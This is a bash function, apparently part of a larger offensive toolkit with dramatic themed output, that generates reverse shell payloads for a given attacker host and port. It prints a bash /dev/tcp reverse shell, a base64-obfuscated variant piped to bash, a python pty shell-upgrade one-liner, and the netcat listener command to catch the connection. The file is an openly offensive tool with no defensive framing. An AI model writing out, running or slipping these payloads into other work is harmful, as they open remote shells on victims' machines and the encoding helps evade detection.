#!/bin/bash

generate_payloads() {
    local lhost="${STATE[lhost]}"
    local lport="${STATE[lport]}"

    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// WEAPONIZATION PROTOCOL ACTIVE ]${TXT_VOID}─────────────────────────────────╖${NC}"
    local sep_mid="${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────╢${NC}"
    local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────╜${NC}"

    echo -e "\n$sep"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// COMPILING COGNITIVE INTRUSION ARTIFACTS${NC}"
    echo -e "${TXT_VOID}╟─${TXT_MID_RED}[ i ] TUNING CONNECTION GATEWAY:${NC} ${TXT_RED_SUPERNOVA}${lhost}:${lport}${NC}"
    echo -e "${TXT_VOID}│${NC}"

    local bash_rev="bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"
    local b64_rev=$(echo -n "$bash_rev" | base64 -w 0)
    local py_shell="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"

    echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ Bash  ]${NC} ${TXT_B_LASER}${bash_rev}${NC}"
    echo -e "${TXT_VOID}├─${TXT_RED_ALARM}[ B64   ]${NC} ${TXT_RED_MAGMA}echo ${b64_rev} | base64 -d | bash${NC}"
    echo -e "${TXT_VOID}├─${TXT_RED_PLASMA}[ TTY   ]${NC} ${TXT_RED_SUPERNOVA}${py_shell}${NC}"
    echo -e "${TXT_VOID}│${NC}"
    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ ! ] LISTENER CONFIGURATION MANDATE:${NC}"
    echo -e "${TXT_VOID}│${NC}     ${TXT_RED_LASER}Launch active interceptor in separate workspace:${NC} ${TXT_B_PLASMA}nc -lvnp ${lport}${NC}"
    echo -e "$sep_bot\n"
}